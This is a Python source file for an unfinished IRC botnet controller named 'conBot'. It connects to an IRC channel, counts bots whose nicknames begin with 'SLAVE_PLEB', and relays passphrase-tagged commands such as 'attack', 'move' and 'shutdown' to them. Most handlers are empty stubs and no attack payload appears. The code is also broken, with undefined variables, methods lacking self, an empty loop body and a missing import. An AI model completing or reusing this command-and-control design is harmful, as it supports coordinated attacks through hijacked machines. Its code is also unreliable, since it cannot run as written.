import time
import socket 
import sys 



class conBot:
    HOST = None
    PORT = None 
    CHANNEL = None 
    PHRASE = None
    IRCSOCKET = None 

    # CONTROLLER INFO
    conNick = "conBot123"
    liveConnection = False # Flag to see if controller connection to IRC Server is active
    command = None

    # BOT INFO
    botList = []
    botSuccess = []
    botFails = []

    def setup(self, host, port, channel, phrase):
        self.HOST = host
        self.PORT = port
        self.CHANNEL = channel
        self.PHRASE = phrase
        self.IRCSOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        try:
            self.IRCSOCKET.connect((self.HOST, self.PORT))
        except Exception as e:
            sys.stderr.write("Error: " + str(e))
            sys.exit(0)

    def connect(self):
        sock.send(bytes("USER "+ self.conNick +" "+ self.conNick +" "+ self.conNick + " " + self.conNick + "\n", "UTF-8"))
        sock.send(bytes("NICK "+ self.conNick +"\n", "UTF-8"))
        sock.send(bytes("JOIN "+ self.CHANNEL +"\n", "UTF-8"))
        self.liveConnection = True
        print("Controller is running. Connected with nick: " + self.conNick)
        return

    # PingPong protocol
    def pingPong():
        pass 

    # Get response from Bot 
    def getResponse():
        try:
            # Get response from bot
            msg = ircSocket.recv(1024).decode('utf-8')
            return msg 
        except:
            return False

    # COMMANDS

    # Get bot status
    def botStatus():
        # Get bot Nickname and how many there are
        # Append these bots to a list
        msg = getResponse()
        if msg != False:
            msg = msg.strip()
            msgLines = msg.split("\n")
            # Get bot names from split lines
            for x in msgLines:
                if x.startswith(":SLAVE_PLEB"):
                    botName = x[x.find(":", 1) + 1:].strip()
                    botList.append(botName)
            botNames = "\n".join(botList)
            print("Num of bots: " + str(len(botList)) + "\nBot Names:\n" + botNames)
            botList.clear()

    # Tell bot to attack
    def botAttack(host, port, channel):
        sendCommand("attack")
        # Get bot responses 
        msg = getResponse()
        if msg != False:
            try:
                msg = msg.strip()
                msgLines = msg.split("\n")
                for x in msgLines:
                    # Get bot responses
            except:
                pass



    # Tell bot to move channel
    def botMove(host, port, channel):
        pass 

    # Tell bot to quit
    def botQuit():
        pass 

    # Tell bot to shutdown
    def botShutdown(): 
        pass

    # SEND A PRIVATE MESSAGE/COMMAND TO BOTS
    def sendCommand(msg):
        toBot = "PRIVMSG " + CHANNEL + " :" + str(msg) + " " + conNick + " " + PHRASE + "\n"
        IRCSOCKET.send(toBot.encode())
        return

    def botHandler():
        global liveConnection
        while liveConnection:
            # Gotta do the readable thing here
            readable, writable, exceptable = select.select([IRCSOCKET, sys.stdin],[sys.stdout],[])
            for x in readable:
                # Start parsing data 

                # If data starts with PONG, send PING 
                pingPong() 

                # elif data in command 
                # status, attack, move, quit, shutdown 

    """
    # CONNECT TO IRC SERVER CHANNEL
    # This next line goes to a function
    # ircSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    def serverConnect(self, host, port):
        global IRCSOCKET, liveConnection 
        try:
            IRCSOCKET = connect((host,port))
            print("Connection successful")
            liveConnection = True 
            return True
        except:
            print("Connection failed")
            return False 
    """

    def run():
        while true:
            
            if not self.liveConnection:
                self.connect()

            userCommand = input("command> ")
            self.command = userCommand.split()
            # somewhere send phrase to bot
            # check command
            # send command to bots for them to do



if __name == "__main__":
    global HOST, PORT, CHANNEL, PHRASE, IRCSOCKET

    # Get sys.argv
    if len(sys.argv) != 5:
        print("Wrong numnber of arguments")
        sys.exit() 
    
    HOST = sys.argv[1]
    PORT = sys.argv[2]
    CHANNEL = sys.argv[3]
    PHRASE = sys.argv[4]

    if not PORT.isdigit():
        print("Invalid port.")
        sys.exit() 
    
    cbot = conBot()
    cbot.setup(HOST, PORT, CHANNEL, PHRASE)

    # Keep connection to IRC server 
    while True:
        con.run()
        """
        connectStatus = serverConnect(HOST, PORT)
        if connectStatus == True:
            # Send initial PING? 
            pingPong()

            # Start giving commands to bot
            botHandler()
        """
